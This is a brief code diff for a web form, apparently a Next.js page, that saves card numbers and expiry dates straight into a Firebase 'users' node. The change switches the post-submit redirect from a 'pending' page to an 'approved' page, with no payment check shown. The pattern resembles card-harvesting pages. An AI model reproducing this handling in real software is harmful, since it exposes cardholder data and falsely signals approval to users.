@@ -51,7 +51,7 @@ export default function Page() {
     e.preventDefault();
     const formRef = ref(database, "users");
     await push(formRef, formData);
-    router.push("/pending");
+    router.push("/approved");
     setFormData({
       card_no: "",
       expiry_date: "",
